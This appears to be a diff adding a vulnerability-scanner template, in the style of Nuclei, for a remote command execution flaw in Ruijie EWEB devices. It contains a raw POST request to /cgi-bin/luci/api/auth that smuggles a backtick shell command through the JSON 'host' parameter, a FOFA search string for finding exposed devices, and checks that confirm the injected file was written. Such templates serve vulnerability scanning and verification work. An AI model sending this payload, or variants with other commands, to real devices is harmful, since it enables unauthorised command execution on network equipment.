@@ -1,0 +1,42 @@
+id: poc-wsr73h5cb9gi8wbk
+info:
+  name: 锐捷 EWEB auth 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wsr73h5cb9gi8wbk'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wsr73h5cb9gi8wbk
+    fofa: body="cgi-bin/luci" && body="#f47f3e"
+http:
+- raw:
+  - 'POST /cgi-bin/luci/api/auth HTTP/1.1
+
+
+    Content-Type: application/json
+
+
+
+
+    {"method":"checkNet","params":{"host":"`echo dudesite>dudesite.txt`"}}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?code)(?=.*?data).*?$
+
+
+    # 上传文件定位
+
+    /cgi-bin/dudesite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
